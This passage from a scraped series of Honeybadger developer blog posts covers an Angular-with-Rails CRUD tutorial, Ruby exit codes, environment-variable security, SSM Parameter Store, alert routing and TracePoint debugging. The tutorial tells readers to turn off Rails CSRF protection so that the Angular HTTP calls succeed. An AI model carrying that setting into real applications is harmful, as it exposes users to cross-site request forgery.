@Component and OnInit The @Component decorator is important because it marks this class a recognizable Angular component and provides metadata configurations that help Angular deal with them regarding processing, instantiation, and use during the runtime. Take the following metadata configs: @ Component ({ selector : \" users \" , template : templateString , }) Here, selector tells Angular that the provided value is the CSS selector it may use to identify the current directive into a template; yes, it is the same template provided in the next metadata property. The OnInit interface, however, is optional, and it's a good way to initialize stuff before the component finishes its lifecycle. It works like a post-construct method. Dependency Injection Angular is a DI ( Dependency Injection ) framework, a characteristic that increases its modularity and productivity. Dependencies in Angular can vary from your services and repositories to any kind of ordinary object you feel is fit to be injected somewhere else in the code. To turn a class \"injectable\", you only need to annotate it with the @Injectable decorator: @ Injectable ({ providedIn : \" root \" , }) export class UserService { ... } The providedIn indicates which injector will provide the injectable you're creating. The root value tells Angular that the injector should be the application-level one. There are more that you can check on here . To inject the class into a component, for example, you ask Angular to do it in the component's constructor: constructor ( private userService : UserService , ) {} It’s as simple as that! The Finished Component Below, you can find the final code listing for our User component. Place it into index.component.ts , under the javascript/hello_angular/app/ folder. import { Component , OnInit , TemplateRef } from \" @angular/core \" ; import { FormGroup , FormBuilder } from \" @angular/forms \" ; import { BsModalRef , BsModalService } from \" ngx-bootstrap/modal \" ; import templateString from \" ./index.component.html \" ; import { UserService } from \" ../user.service \" ; import { User } from \" ../user.class \" ; @ Component ({ selector : \" users \" , template : templateString , }) export class UserIndexComponent implements OnInit { users : User []; modalRef : BsModalRef ; userForm : FormGroup ; isNew : Boolean ; constructor ( public fb : FormBuilder , private userService : UserService , private modalService : BsModalService ) {} public newUser ( template : TemplateRef < any > ) { this . reset (); this . modalRef = this . modalService . show ( template ); } public createUser () { this . userService . create ( this . userForm . value ). subscribe (() => { console . log ( \" User created! \" ); this . reset (); this . modalRef . hide (); }); } public editUser ( user , template : TemplateRef < any > ) { this . isNew = false ; this . userForm = this . fb . group ({ id : [ user . id ], name : [ user . name ], age : [ user . age ], address : [ user . address ], }); this . modalRef = this . modalService . show ( template ); } public updateUser () { const { id } = this . userForm . value ; this . userService . update ( id , this . userForm . value ). subscribe (() => { console . log ( \" User updated! \" ); this . reset (); this . modalRef . hide (); }); } public deleteUser ( id ) { if ( confirm ( \" Are you sure? \" )) { this . userService . delete ( id ). subscribe (() => { console . log ( \" User deleted! \" ); this . reset (); }); } } ngOnInit () { this . reset (); } public reset () { this . isNew = true ; this . userService . getUsers (). subscribe (( users ) => { this . users = users ; }); this . userForm = this . fb . group ({ id : [ \"\" ], name : [ \"\" ], age : [ \"\" ], address : [ \"\" ], }); } } The users array will hold the current table data listed on the screen and retrieved from the reset method that, in turn, calls our Rails API via UserService (to be created). The userForm is just a reference to help create and update our users since the same form will be used for both operations. The isNew also helps with that, identifying which flow we’re in at the moment. Here, we have a CRUD-equivalent method for each of the operations. Each of them calls the respective UserService method to commit the process in the Rails API. We’ll also need to set up the HTML module to convert our templates to HTML (we'll see more on modules soon). So, open the html.d.ts file within the same folder and add: declare module \" *.html \" { const content : string ; export default content ; } The Angular Service and Model Let’s move on to Angular’s UserService creation. Angular is a framework, just like Rails. So, it means that it’s okay to obey their rules even if this means having duplicate (or very similar) models, for example. What is a Model? Angular models are simple objects that hold data attributes that make sense together (i.e., they represent a concise piece of your domain). They are just like any other model in most languages and frameworks. It helps a lot to have your data concentrated in one place, rather than duplicating it throughout the code like we do with our user's model: export class User { constructor ( public id : number , public name : string , public age : number , public address : string ) {} } Remember that it's TypeScript, so your model's attributes must always have a type defined. Create a new file called user.class.ts under the javascript/hello_angular/app/user/ folder and place the code above into it. What about a Service? Services are a broad concept, but we can understand them as well-defined and purposed objects. They help the components with more complex logic, serving them with processed and transformed data, usually coming from an external service or a database. A service doesn't need any specific annotation or interface; you just create a class and make it injectable , as we've seen before. Then, you can inject it into your components. Observable Services Another interesting feature of Angular is that it allows you to use RxJS with your classes. For example, the Angular's default HTTP client, the same one that we'll use to fetch information from an external service, returns RxJS Observables . This is why, when you call any of our UserService methods within the user component, you might subscribe to the Observable result: this . userService . getUsers (). subscribe (( users ) => { this . users = users ; }); Note that if you're not familiar with RxJS, I'd strongly recommend a brief read over its documentation ; it's not that hard! ;) Again, in the javascript/hello_angular/app/user/ folder, create another file called user.service.ts . This is its content: import { Injectable } from \" @angular/core \" ; import { HttpClient , HttpHeaders } from \" @angular/common/http \" ; import { map } from \" rxjs/operators \" ; import { Observable } from \" rxjs \" ; import { User } from \" ./user.class \" ; @ Injectable ({ providedIn : \" root \" , }) export class UserService { constructor ( private http : HttpClient ) {} httpOptions = { headers : new HttpHeaders ({ \" Content-Type \" : \" application/json \" , }), }; getUsers (): Observable < User [] > { return this . http . get ( \" /users.json \" ). pipe ( map (( users : User []) => users . map (( user ) => { return new User ( user . id , user . name , user . age , user . address ); }) ) ); } create ( user ): Observable < User > { return this . http . post < User > ( \" /users.json \" , JSON . stringify ( user ), this . httpOptions ); } update ( id , user ): Observable < User > { return this . http . put < User > ( \" /users/ \" + id + \" .json \" , JSON . stringify ( user ), this . httpOptions ); } delete ( id ) { return this . http . delete < User > ( \" /users/ \" + id + \" .json \" , this . httpOptions ); } } Can you spot the similarities between this one and the component we’ve just created? This is because we need correspondent operations to support the ones in the component. Note that the HttpClient must also be injected within the class’ constructor, so we get to use it alongside the class. Each operation makes an HTTP call to our Rails API, the auto-generated one. Views Angular works with templates for its views. A template is a sort of hierarchical HTML-and-JavaScript mix that tells Angular how to render each component. However, before going any further with the construction of our view, let's first understand how Angular splits its template system up. The Angular Directives Because the Angular templates are essentially dynamic, some directives are needed to drive Angular through the right way to render stuff. Directives are simply classes with a @Directive decorator, like the components. Yes, @Component inherits from @Directive , so it's officially a directive too. However, there are two other types: the structural and attribute directives. Structural Directives These directives represents conditional and loop structures translated from JavaScript into the Angular template. They help make the template as dynamic as possible, like if you were programming within your vanilla JavaScript code. Take the following example: <tr *ngFor= \"let user of users\" > <td> {{ user.name }} </td> </tr> The *ngFor directive tells Angular to iterate over the array of users and print each user's name to the DOM. Attribute Directives These work directly with the appearance or behavior of the elements. Take the following example: <form [formGroup]= \"userForm\" (ngSubmit)= \"isNew ? createUser() : updateUser()\" novalidate ></form> Here, we're modifying the behavior of the form by conditionally setting its submit function and making use of Angular's FormGroup to data-bind each of the form inputs. Data Binding Creating forms with web frameworks can be a tricky and error-prone task if it doesn't provide data binding. Angular supports two-way data binding, which means that you can directly connect pieces of your template to the component and vice versa. The above form is a good example of the FormGroup data binding power. It automatically binds each form field to the userForm object created within our component. In the editUser method, for example, you can see the opposite version of the binding, in which the userForm 's values are set within the component and shall reflect the form on the view. Building the Index View Let’s break down the content for index.component.html into two parts. This is the first one: <div class= \"container pricing-header px-3 py-3 pt-md-5 pb-md-4 mx-auto text-center\" > <h1 class= \"display-4\" > User's Listing </h1> <p class= \"lead\" > A quick CRUD example of how to integrate Rails with Angular </p> <table class= \"table\" > <tr> <th> Id </th> <th> Name </th> <th> Age </th> <th> Address </th> <th> Actions </th> </tr> <tbody> <tr *ngFor= \"let user of users\" > <td> {{ user.id }} </td> <td> {{ user.name }} </td> <td> {{ user.age }} </td> <td> {{ user.address }} </td> <td colspan= \"2\" > <button class= \"btn btn-secondary\" (click)= \"editUser(user, template)\" > Edit </button> | <button class= \"btn btn-danger\" (click)= \"deleteUser(user.id)\" > Delete </button> </td> </tr> </tbody> </table> <button class= \"btn btn-primary float-right mt-4\" (click)= \"newUser(template)\" > Insert New </button> </div> Most of it is composed of plain HTML. We won’t go into detail about Bootstrap classes. The important part here is the ngFor directive on the table’s row. It helps iterate over the users array (remember it?) printing each of its attributes to the HTML output through the {{ … }} operator. Whenever you want to add one of the DOM events, like the onClick , just wrap the event name with parentheses and add the component function that it will call when clicked. Building the Modal View The second part is related to the modal contents, so add it below the previous one: <ng-template #template > <div class= \"modal-header\" > <h4 class= \"modal-title pull-left\" > {{ isNew ? \"New User\" : \"Update User\" }} </h4> <button type= \"button\" class= \"close pull-right\" aria-label= \"Close\" (click)= \"modalRef.hide()\" > <span aria-hidden= \"true\" > &times; </span> </button> </div> <div class= \"modal-body\" > <form [formGroup]= \"userForm\" (ngSubmit)= \"isNew ? createUser() : updateUser()\" novalidate > <input type= \"hidden\" formControlName= \"id\" class= \"form-control\" /> <div class= \"form-group\" > <label> Name </label> <input type= \"text\" formControlName= \"name\" class= \"form-control\" /> </div> <div class= \"form-group\" > <label> Age </label> <input type= \"text\" formControlName= \"age\" class= \"form-control\" /> </div> <div class= \"form-group\" > <label> Address </label> <textarea class= \"form-control\" formControlName= \"address\" rows= \"3\" ></textarea> </div> <button type= \"submit\" class= \"btn btn-primary\" > Submit </button> </form> </div> </ng-template> Note that we’re making use of the <ng-template> tag, which allows you to anchor elements between the HTML and Angular. The template ID comes right after the # sign. Within the form, also note that we’re making use of the isNew component variable to verify whether the current usage of this form is related to a user’s creation or update. Finally, we need to inject the whole hello_angular application into the Rails index.html.erb page. So, open this file under the views/users/ folder and change its contents to the following: <hello-angular> We're almost done... </hello-angular> < %= javascript_pack_tag ' hello_angular ' % > Angular Modules Now, we need to tell Angular where to find stuff out. It happens within its modules’ configurations. Let’s start by adding content to app-bootstrap.module.ts : import { NgModule } from \" @angular/core \" ; import { CommonModule } from \" @angular/common \" ; import { ModalModule } from \" ngx-bootstrap/modal \" ; @ NgModule ({ imports : [ CommonModule , ModalModule . forRoot ()], exports : [ ModalModule ], }) export class AppBootstrapModule {} This is restricted to the Bootstrap components we’re inheriting from the ngx-bootstrap. The only component we’re making use of for now is the Bootstrap modal. Then, open the app-routing.module.ts file and change its contents to the following: import { RouterModule , Routes } from \" @angular/router \" ; import { NgModule } from \" @angular/core \" ; import { UserIndexComponent } from \" ./user/index/index.component \" ; const appRoutes : Routes = [ { path : \" users \" , component : UserIndexComponent }, { path : \"\" , redirectTo : \" /users \" , pathMatch : \" full \" }, ]; @ NgModule ({ imports : [ RouterModule . forRoot ( appRoutes , { scrollPositionRestoration : \" enabled \" })], exports : [ RouterModule ], }) export class AppRoutingModule {} This will ensure that Angular matches the right User’s component when the /users path is called. And, finally, register all of them within the main AppModule class. Open the app.module.ts file and make sure it looks like this: import { BrowserModule } from \" @angular/platform-browser \" ; import { NgModule } from \" @angular/core \" ; import { HttpClientModule } from \" @angular/common/http \" ; import { FormsModule , ReactiveFormsModule } from \" @angular/forms \" ; import { AppComponent } from \" ./app.component \" ; import { AppRoutingModule } from \" ./app-routing.module \" ; import { AppBootstrapModule } from \" ./app-boostrap.module \" ; import { UserIndexComponent } from \" ./user/index/index.component \" ; @ NgModule ({ declarations : [ AppComponent , UserIndexComponent ], imports : [ HttpClientModule , AppRoutingModule , BrowserModule , FormsModule , ReactiveFormsModule , AppBootstrapModule ], providers : [], bootstrap : [ AppComponent ], }) export class AppModule {} Here, everything’s mapped. From our form, the HTTP client and the user component to the Bootstrap module configs, and routing. Finishing Configs Up Before we jump into the tests, we need to finish some stuff up, starting with the app.component.ts file: import { Component } from \" @angular/core \" ; @ Component ({ selector : \" hello-angular \" , template : \" <router-outlet></router-outlet> \" , }) export class AppComponent { name = \" Angular! \" ; } The main app component needs to know how to route the paths, so the RouterOutlet will do the job. Then, we need to make sure that Webpacker understands the HTML extension we’re working with so far. For this, open the webpacker.yml file and, under the /config folder, search for the extensions section and add the following item: - .html Webpacker only recognizes the built-in TypeScript loader that comes by default with Angular. We need to process HTML, which is why we previously installed the html-loader dependency. To set it up, open the environment.js file, under the config/webpack folder, and add the following loader config: environment . loaders . append ( \" html \" , { test : / \\. html$/ , use : [ { loader : \" html-loader \" , options : { minimize : true , }, }, ], }); Finally, to prevent our Angular service from receiving errors on their HTTP calls, we need to disable the CSRF token checks performed by Rails. For this, open the application_controller.rb file, under the app/controllers folder, and change its contents to the following: class ApplicationController < ActionController :: Base protect_from_forgery with: :null_session end Testing That’s it! It looks a bit tricky since the setup requires a lot of customizations, but the result is worth it. To test, save everything, and start the server by issuing the rails s command. Then, go to your web browser and type the address http://localhost:3000/users . Go ahead and play around with the CRUD web application. Conclusion It’s been a long road to get this CRUD up and running. After the first trial, you’ll see that things get easier for your future projects. I hope this project helps to set up a starting point for those of you that want to start a project quickly by joining both techs. While we don’t have an open-source scaffolding project to help with it, we rely on each other’s efforts to have materials like that. Now, it’s your turn; fork the project (or create it from scratch) and start making your customizations. The GitHub repository for this example can be found here . Have fun!", "date": "2021-04-12"},
{"website": "Honey-Badger", "title": "Introducing Public Dashboards", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/public-dashboards/", "abstract": "Software development is more fun with friends; that's why we've built tons of collaboration features into Honeybadger over the years, making it easier for teams to fix errors. Recently the team at DEV emailed us with a feature request: could we make it easier to involve the broader DEV open source community in the error-fixing process? Today, we're excited to announce a new feature that does exactly that: Public Dashboards . A public dashboard is a secret URL that you can share with outside users (such as contractors and open-source contributors). When you use the share button (see below for details) from the error details page, that error appears on the public dashboard for your project—making it easy for everyone to discover new errors to fix. Backstory on the share button Most DevOps tools do not adapt well to community projects, where the team is continually changing. It's is a problem we've thought a lot about in the past: open-source benefits from anyone in the world being able to jump in and fix an error, but sometimes the needed production data is private. To begin to address the problem, we added the ability to \"share\" an error with an outside user, scrubbed of all PII (Personally Identifiable Information, such as user IDs and session data). This single feature made it easy for core teams to share vital debugging information (such as error messages and stack traces) with community members without a ton of copy/pasting: The Community Dashboard DEV wanted us to take this a step further and create a public dashboard where the community could see existing production errors and contribute a fix. We loved the idea so much that we fast-tracked it and are launching it today. Of course, not everyone wants a public dashboard for their Honeybadger project, so it's disabled by default. To enable it, head over to Settings -> Advanced -> Enable Public Dashboard, and flip the bit: Feel free to send the unique dashboard link to just a few team members, or share it with the world. Conclusion We are stoked to have the opportunity to work with the DEV team on this, and can't wait to see what other open source communities do with it. If you're involved in an open-source community that runs production applications, Honeybadger is for you. It's also free for non-commercial open-source projects. Sign up today!", "date": "2020-03-13"},
{"website": "Honey-Badger", "title": "How to exit a Ruby program", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-exit-a-ruby-program/", "abstract": "As developers, we spend so much time on making our programs run that it's easy to overlook how they exit. And it's important! When your programs behave correctly on exit, it makes them a lot easier to manage and makes them more likely to work with standard devops tools. There are a lot of ways that you can exit a Ruby program. I've shown some of them below. In this post we'll discuss the details of each of these, and how they can be used to make your app a well-behaved unix citizen. # You can exit by calling a method exit exit! abort ( \"She cannot take any more of this, Captain!\" ) # ...or by failing to catch an exception raise ( \"Destroyed...\" ) fail # ...or by letting the program end naturally. :) Exit codes, and YOU Every program you run on Linux and OSX returns an exit status code when it's finished running. You don't normally see the exit code. It's used by the OS behind-the-scenes to determine if the program exited normally or if there was an error. If you're using bash, you can see the exit code of the program that you just ran by examining the $? environment variable. The example below shows the exit code for a failure, then for a success. % ls this-file-doesnt-exist ls : this-file-doesnt-exist: No such file or directory\nblog% echo $? 1\n% ls . bm.rb \n% echo $? 0 Generally, the rule for unix-based systems is that zero means success. Nonzero means failure. If you've ever used the && \"operator\" in bash, then  you've used status codes. In the example below, we tell bash to run program B only if program A was successful. % a && b You can use this trick in a lot of ways. For example, you might want to precompile assets, and upload them to a CDN. blog % rake assets :precompile && rake cdn :upload_assets Specifying an exit status with Ruby Ruby takes care of a lot of the exit status stuff for us. If your program exits normally, it returns a \"success\" status. If it fails due to an uncaught exception, it gives a \"failure\" status. Below I'm showing the exit code for a script that raised an exception. % ruby err.rb\nerr.rb:1:in ` <main> ': goodbye (RuntimeError)\ntmp% echo $?\n1 But what if you didn't want any uncaught exceptions? What if you wanted to exit cleanly, but still return a \"failed\" error code? Moreover, what if you wanted to return a custom code with an error message? Fortunately, it's quite easy. Just pass an argument into the exit function. The argument can be a boolean or an integer. If it's boolean, then true means success. If it's an integer than 0 means success. exit ( true ) # Exits with \"success\" code exit ( 0 ) # Exits with \"success\" code exit ( false ) # Exits with \"failure\" code exit ( 1 ) # Exits with \"failure\" code exit ( 436 ) # Custom failure error code How exit works under the hood The exit method simply raises a SystemExit exception. If it's uncaught, the program aborts just like it would with any other uncaught exception. That's pretty cool,  but there are some interesting consequences. If you were to swallow all SystemExit exceptions, you'd break the exit method. I've shown this in the example below. begin exit 100 rescue SystemExit => e puts \"Tried to exit with status #{ e . status } \" end puts \"...but it never exited, because we swallowed the exception\" # Outputs: # Tried to exit with status 100 # ...but it never exited, because we swallowed the exception This is yet another reason never to rescue Exception . Because SystemExit inherits from Exception , swallowing Exception will cause exit to break. begin exit rescue Exception # never do this puts \"I just broke the exit function!\" end Human-readable error messages While exit codes are great for machines, we humans often prefer a little bit of explanatory text. Fortunately, the OS provides us with an output stream specifically for things like error messages. Yep, I'm talking about STDERR. You can write to STDERR just like you write to any IO object. In the example below I'm writing an error message and exiting with an \"error\" status. STDERR . puts ( \"ABORTED! You forgot to BAR the BAZ\" ) exit ( false ) This being Ruby, there is of course a more concise way to write to stdout and exit with an error code. Just use the abort method. # Write the message to STDERR and exit with an error status code. abort ( \"ABORTED! You forgot to BAR the BAZ\" ) Callbacks via at_exit Ruby lets you register handlers which can be called whenever the program exits. There can be more than one of them - they're called in the opposite order that they were registered in. Here's what it looks like: at_exit do puts \"handler 1\" end at_exit do puts \"handler 2\" end # Outputs \"handler2\\nhandler1\" on exit The exit handler can override the exit code. You do this by calling exit from within the handler. Even though it seems like this should cause an infinite loop, it doesn't. :) at_exit do exit 100 end exit 0 # This program exits with a code of 100 If you want to exit without calling any callbacks, you can do so via the exit! method. But keep in mind that this may cause problems if you have gems or other third-party code that depends on those callbacks. An interesting aside It turns out that lots of libraries use at_exit in inventive - and some might say hacky - ways. For example, Sinatra uses an at_exit hook to as a way to boot up the web app. This allows it to be sure that all your code has been loaded before it starts the server. Here's what it looks like: module Sinatra class Application < Base ... at_exit { Application . run! if $! . nil? && Application . run? } end There's a great post about this on the Arkency blog: Are we abusing at_exit?", "date": "2015-09-01"},
{"website": "Honey-Badger", "title": "Securing Environment Variables", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/securing-environment-variables/", "abstract": "In our previous article, The Rubyist's Guide To Environment Variables , we showed you how the environment variable system works, and busted some common myths. But as one helpful reader pointed out, we didn't say much about security. Since it's become common to use env vars for storing secret API keys and other valuable information, It's important to understand the security implications. Let's take a look: The Worst Case Scenario Imagine that a hacker has gained access to your server as root, or as the user who owns your web applications. In that case, your environment variables will be compromised, along with everything else that's not highly encrypted. The solution here is to keep people from getting root access to your servers. :) The Trojan Horse Some guy you met in an alley by the docks gave you a special souped-up version of imagemagick. He claims it'll run twice as fast as the stock imagemagick. ...So you do what anyone would do. You install it in production. The only problem is that it's designed to steal your environment variables. Here, I'm running our \"malicious\" mogrify command from Ruby, using the back-ticks syntax. Mogrify then steals my environment variables, and prints a taunting message. Environment variables get copied from the parent process (irb) to the child pocess (mogrify) This isn't really a \"hack.\" This is just how environment variables work. They get copied from parent process to child process. If you happen to be running malware, they'll inherit environment variables just like any other app. There are two ways for this to happen: Someone convinces you to install a piece of malicious software in your toolchain A \"benign\" piece of your toolchain has a vulnerability and is exploited to reveal your environment variables. The real solution is to be proactive in preventing either of those from happening. But there is a precautionary step you can take to limit damage in case some ENV stealing bandit does wind up in your toolchain. Sanitizing the Environment Whenever you shell out of Ruby to run imagemagick or any other program, that program inherits a copy of your app's ENV. If you have any secrets in the ENV, it will get those too. Unless you strip them out. You can override specific environment variables when you create the new process, by passing a hash to the system method: How to pass custom environment variables into Ruby's system method If you want to stop sending any environment variables when you shell out, you might do something like the example below. Here we create a hash that mirrors ENV, except that all its values have been set to nil. It's not pretty, but it's the only way I've found to remove all env vars when executing a shell command. How to stop sending any environment variables when you run a shell command from ruby Don't throw the baby out with the bathwater Inheritance is one of the most useful features of ENV variables. Suppose you need to run a command that writes to S3. Environment variable inheritance means  that the command can share the API keys from your Ruby app in a seamless way.   You'd lose that ability if you never allowed inheritance. Persistence Every process has its own set of environment variables that die when the process dies. You can set environment variables in your Ruby app, but they'll disappear as soon as that app quits. If you need an environment variable to stick around after reboot, it needs to be stored somewhere. That somewhere is usually on the filesystem. Don't use your app's git repo I'm sure the folks at github are as honest as the rest of us, but do you really want everyone who has access to your source code to be able to get your API keys and run up a $10,000 AWS bill? Avoid using .bashrc or .bash-profile for secrets When you store secrets in files like .bashrc, they're sent as environment variables to every single program that you run as that user. Most of these programs don't need to know your secrets. So why give them to them? Only reveal your secrets to the processes that need them If your Rails app is the only process that needs to know your HONEYBADGER_API_KEY, then it's a good idea to only make it available to that process. There are several gems that let you add environment variables to a file that is loaded when Rails starts. These env vars are only available to your Rails process, and its child processes.  There is a section on the figaro and dotenv gems at the bottom of The Rubyist's Guide To Environment Variables . Secure your configuration files If you're loading your environment from a configuration file, you'll want to make sure that its permissions are set so that it's only readable by the user running your web app. Here, I'm making my config file readable and writable only by the user that created it. In this case, it's the same user that owns my Rails application: Make configuration files readable only by the user that needs to read them Since you're not checking it into github, you'll need to either SSH into the server and edit it manually or use a tool like Chef to manage it for you. Build \"firewalls\" where possible One of the really great things about AWS is that it lets you create access control policies that are super granular. A lot of service providers have features like this. What does that mean? It means that you can have one set of API keys that will only allow whoever has them to upload to a single bucket on S3. You should create separate keypairs for separate activities. One keypair for uploading images. Another for your database backup. And so on. By operating this way you can limit the damage of any one security breach.", "date": "2015-06-15"},
{"website": "Honey-Badger", "title": "Configure Your App with SSM Parameter Store", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/configuration-with-ssm-parameter-store/", "abstract": "Configuring your Rails app via environment variables works well, but sometimes you want to be able to update your configuration on the fly. Here's a way to update your app's environment using SSM Parameter Store . Why would you want to do this? Well, say you deploy your Rails app to an EC2 instance that's part of an autoscaling group. To get the fastest boot times, you should create a custom AMI with your code already on it (a.k.a. a golden image) that the autoscaling group can use when it's time to boot a new instance. Unfortunately, if you store your configuration on the image (and use something like dotenv to load it), you'll need to create a new AMI every time you have a configuration change. You can work around this by using SSM Parameter Store parameters, and let your app fetch its configuration at boot time. Putting data into Parameter Store is easy enough -- you can use the CLI or the AWS console to edit the variables. But how do you get the data back out for your app to use? One way to do it is to fetch these parameters into your ENV via an initializer, like so: Aws :: SSM :: Client . new . get_parameters_by_path ( path: \"/honeybadger/ #{ Rails . env } /\" , recursive: true , with_decryption: true ). parameters . each do | param | ENV [ param [ \"name\" ]. split ( \"/\" ). last ] = param [ \"value\" ] end Assuming you have parameters named like honeybadger/production/MY_API_KEY , this snippet will result in ENV[\"MY_API_KEY\"] having whatever value you supplied for that parameter. But what if loading the environment variable values in an initializer is too late in the Rails boot up process? What if you need settings like DATABASE_URL to be set in SSM and you need to use those settings before your app loads? For that, you can save the variables to a .env file and let dotenv handle that . But first, let's set up the database and store our DATABASE_URL value. Here's a terraform snippet that creates an RDS instance and stores the connection in SSM Parameter Store: resource \"aws_db_instance\" \"db\" { allocated_storage = 20 storage_type = \"gp2\" engine = \"postgres\" engine_version = \"11.4\" password = \"${var.database_password}\" name = \"honeybadger\" username = \"honeybadger\" } resource \"aws_ssm_parameter\" \"database_url\" { name = \"/honeybadger/${var.environment}/DATABASE_URL\" type = \"SecureString\" value = \"postgres://${aws_db_instance.db.username}:${var.database_password}@${aws_db_instance.db.endpoint}/${aws_db_instance.db.name}\" } With the following shell command, you can grab all the parameters (just like we did with the Ruby snippet above) and get them ready for use as environment variables: aws ssm get-parameters-by-path --path /honeybadger/production/ \\ --recursive --with-decryption --output text \\ --query \"Parameters[].[Name,Value]\" | sed -E 's#/honeybadger/production/([^[:space:]]*)[[:space:]]*#export \\1=#' \\ > /home/honeybadger/shared/.env.production.local Now you have a .env.production.local file that dotenv can load -- assuming that it's symlinked into your current path at deploy time, if you are using capistrano. As a bonus, you can also source that env file to have variables like $DATABASE_URL defined for you in any shell scripts you want to run. We put that shell command in our deployment script (which is triggered by our CI/CD pipeline), so any new code that goes to production will pick up any changes to made to our parameters in SSM. Now we get to have our golden image and we don't have to build a new one for every configuration change. 😎", "date": "2019-10-08"},
{"website": "Honey-Badger", "title": "Making Exception Alerts Fit in Your Ops Workflow", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/integrating-error-monitoring-into-your-team-workflow/", "abstract": "Honeybadger was one of the first to let you send exception notifications to services like Slack, Github Issues and PagerDuty. Based on customer feedback, we've doubled down - launching a suite of features that gives you incredible control over how you integrate exception monitoring into your toolchain. Now you can: Route high priority alerts to specific chat rooms Notify your on-call team when specific errors spike in frequency Temporarily silence alerts when the $%^& hits the fan and you're focused on fixing the problem Route alerts to different teams based on where they occurred in your app, or on which servers. To see this in action, check out our new video below. It's only a few minutes long, but it will revolutionize the way that your team works with error alerts. Here are a few highlights from the video, in case you don't have your headphones handy. :) Events You get to choose exactly which events result in a notification or ticket being created: Rate Escalations Escalations let you receive extra notifications when your error rate goes above a number you've configured. Throttling Lets you protect yourself from floods of notifications when everything goes wrong at once. Filters With filters you can be hyper-precise about which errors trigger notifications or issue creation. You could Send alerts to a special chatroom if an error is caused by your CEO Create issues in separate trackers for staging, preprod and production Route notifications to a certain team's inbox whenever an error assigned to that team reoccurs. Environments You can ignore environments. We auto-populate the list based on environments we've seen in your app.", "date": "2016-04-06"},
{"website": "Honey-Badger", "title": "Using TracePoint to explore complex exception behavior in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/using-tracepoint-to-explore-complex-exception-behavior-in-ruby/", "abstract": "Sometimes it can be really difficult to understand what's happening with exceptions - especially in larger apps. Imagine that you're working on some code inside an existing project. You raise an exception, then something weird happens. Maybe the exception is swallowed. Maybe an environment variable is changed. Maybe your exception gets wrapped in another exception. I'm going to show you a simple way to use TracePoints to get a little more information about exceptions in your app - even if those exceptions are swallowed. A Convenient Example The boundary between controllers and views in Rails is one spot where exceptions seem to defy logic. It's easy to see for yourself. Just raise an exception in a view and try to rescue it in a controller. You'll find that you CAN'T rescue the template error from the controller! # pages_controller.rb def index render rescue # this will never run logger . debug \"someone raised the roof\" end # index.haml - raise \"the roof\" WTF!?! I thought I rescued this! It's obvious that there's something tricky going on. Let's see if we can figure out what it is. Logging All Exceptions With TracePoint TracePoints are a really powerful introspection tool that have been around since Ruby 2.0. They allow you to define callbacks for a wide variety of runtime events. For example, you can be notified whenever a class is defined, whenever a method is called or whenever an exception is raised. Check out the TracePoint documentation for even more events. Let's start by adding a TracePoint that is called whenever an exception is raised and writes a summary of it to the log. class PagesController < ApplicationController def index TracePoint . new ( :raise ) do | tp | # tp.raised_exeption contains the actual exception object that was raised! logger . debug \" #{ tp . raised_exception . object_id } : #{ tp . raised_exception . class } #{ tp . raised_exception . message } \" . yellow + tp . raised_exception . backtrace [ 0 ]. sub ( Rails . root . to_s , \"\" ). blue end . enable do render end end end If you're curious about the yellow and blue methods,  I'm using the colorize gem . It adds ANSI color codes to the output. Now when I go and refresh my page, my logs look like the screenshot below. One interesting thing that you might notice is that there are two separate exceptions, and each of them is raised twice. That long number at the beginning of each line is the Exception's object id. That's how we know there are two exception objects, not four. This log shows every use of raise in the rendering process Which Method Caused Which Raise? Having a list of \"raise\" events is pretty useful. But it would be even better if we had some idea of which methods were causing each raise. Once again, TracePoint comes to the rescue. TracePoint lets us add a handler that is called whenever a method returns. It's just as simple to use as the \"raise\" event was. In the example below we're logging every method return: TracePoint . trace ( :return ) do | tp | logger . debug [ tp . method_id , tp . lineno , tp . path . sub ( Rails . root . to_s , \"\" )]. join ( \" : \" ). green end There's one problem though. If you add this code to your rails app, you'll find that your app stops responding to requests. There are so many method calls in the simplest Rails request that the server times out before it can write them all to the log. Since we're really only interested in method calls that caused exceptions, lets modify our code to output the first two \"return\" events that happen after each exception. class PagesController < ApplicationController def index counter = 0 return_trace = TracePoint . trace ( :return ) do | tp | logger . debug \" \\t \" + [ tp . method_id , tp . lineno , tp . path . sub ( Rails . root . to_s , \"\" )]. join ( \" : \" ). green if ( counter += 1 ) > 3 return_trace . disable counter = 0 end end return_trace . disable # disable the tracepoint by default TracePoint . new ( :raise ) do | tp | logger . debug \" #{ tp . raised_exception . object_id } : #{ tp . raised_exception . class } #{ tp . raised_exception . message } \" . yellow + tp . raised_exception . backtrace [ 0 ]. sub ( Rails . root . to_s , \"\" ). blue # The \"raise\" enables the \"return\" tracepoint return_trace . enable end . enable do render end end end When I refresh my browser, I see the following lines have been added to the log: Each \"raise\" event is shown above the method which caused it Because we only enable the \"return\" TracePoint when an exception is raised, the first \"return\" event is going to be from the method that raised the exception. We can use this information to solve our mystery. Our original RuntimeError is being converted to an ActionView::Template::Error by the handle_render_error method on line 310 of template.rb. The nice thing about this technique is that it doesn't have anything to do with Rails. You can use it any time you need to understand in greater detail which exceptions are being raise and caught under the hood.", "date": "2015-07-06"},
{"website": "Honey-Badger", "title": "Testing object allocations with RSpec", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/testing-object-allocations/", "abstract": "Everyone is talking about Ruby performance lately, and with good reason. It turns out that with some smallish tweaks to your code it's possible to increase performance by up to 99.9% . There are plenty of articles out there on how to optimize your code, but how can you make sure your code remains optimized? You may not always consider the consequences when embedding a string literal rather than a frozen constant in a regularly called method -- it's much too easy to lose the savings of your optimizations when maintaining your code in the future. These were my thoughts recently as I optimized some code for the second (or third) time in our Ruby gem at Honeybadger: \"wouldn't it be great if there were a way to ensure that these optimizations don't regress ?\" Regressions are something most of us are familiar with in software development, even if not by name. A regression happens when a bug or an issue which was resolved in the past reoccurs due to a future change to the same code. Nobody likes to do the same work more than once; regressions are like tracking dirt on the floor right after it's been swept. Luckily, we have a secret weapon: tests. Whether you practice dogmatic TDD or not, tests are awesome for fixing bugs because they demonstrate the issue and the solution programmatically. Tests give us confidence that regressions won't happen when changes do. Sound familiar? I thought so too, which made me wonder, \"if performance optimizations can regress, why can't I catch those regressions with tests, too?\" There are a lot of great tools for profiling various performance aspects of Ruby including object allocations, memory, CPU, 